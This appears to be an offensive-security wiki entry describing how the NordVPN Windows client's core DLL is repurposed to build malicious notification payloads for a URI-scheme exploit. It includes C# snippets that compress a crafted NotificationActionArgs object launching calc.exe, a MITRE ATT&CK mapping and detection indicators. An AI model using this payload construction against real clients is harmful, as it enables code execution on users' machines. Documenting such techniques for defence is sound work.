---
url: 'https://nordvpn.com/'
tags:
  - nordvpn
  - .net
  - compression
type: tool
platforms:
  - Windows
description: >-
  Core library from NordVPN providing classes for notification handling and
  compression used in payload crafting.
id: da0927be-0ab7-4769-b45b-3135bc70b226
created_at: '2025-12-14T17:24:08.487Z'
updated_at: '2025-12-14T17:24:08.487Z'
verified: false
validated: true
submitted: true
---
# NordVpn-Core

**Status**: Unverified

## Overview

NordVpn.Core.dll is the core assembly from the NordVPN Windows client, containing classes like ObjectCompressor and NotificationActionArgs, repurposed here for crafting malicious payloads in the URI scheme exploit.

## Description

Extracted from the NordVPN installation, it handles internal compression and notification logic. In offensive security, it's used to mimic legitimate payloads for bypassing validation in the client's deserialization process.

## Features

- Feature 1: Object compression for payloads
- Feature 2: Notification argument construction
- Feature 3: URI scheme processing internals

## Installation

### Requirements

- NordVPN client installed on Windows

### Install Commands

```bash
# Extract from installation directory
cp "C:\Program Files\NordVPN\NordVpn.Core.dll" .
# No formal install; reference in C# project
```

## Basic Usage

```csharp
using NordVpn.Core; string compressed = ObjectCompressor.CompressObject(myObject);
```

### Common Options

| Option | Description |
|--------|-------------|
| `ObjectCompressor.CompressObject` | Compresses object to byte array/string |
| `NotificationActionArgs` | Builds args for notifications |

## Examples

### Example 1: Basic Usage

```csharp
NotificationActionArgs args = new NotificationActionArgs("action", dict); string payload = ObjectCompressor.CompressObject(args);
```

### Example 2: Advanced Usage

```csharp
// In exploit context
var dict = new Dictionary<string, string> { {"OpenUrl", "calc.exe"} }; var toastArgs = new NotificationActionArgs("", dict); var exploit = ObjectCompressor.CompressObject(toastArgs);
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploitation for Client Execution]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Unauthorized referencing of NordVpn.Core.dll in external scripts
- Anomalous compression patterns in memory dumps

## Related Procedures

- [[procedures/Craft-Malicious-NordVPN-Notification-Payload]]

## Related Tools

- [[tools/Newtonsoft-Json]]

## References

- NordVPN client binaries; reverse-engineered from executable
